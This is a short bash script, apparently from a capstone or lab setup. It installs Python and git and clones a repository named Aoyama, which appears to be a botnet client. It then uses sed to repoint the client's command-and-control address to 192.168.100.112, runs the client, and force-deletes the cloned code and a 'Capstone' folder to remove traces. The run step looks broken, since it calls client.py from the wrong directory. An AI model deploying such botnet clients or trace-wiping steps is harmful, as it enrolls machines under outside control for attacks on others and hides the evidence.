#!/bin/bash
yum install -y python3
yum install -y git
git clone https://github.com/Leeon123/Aoyama.git
sleep 10 && sed -i "s/cnc                  = \"127.0.0.1\"/cnc                  = \"192.168.100.112\"/g" ./Aoyama/client.py
python3 client.py
rm -rf ./Aoyama
cd ..
rm -rf Capstone/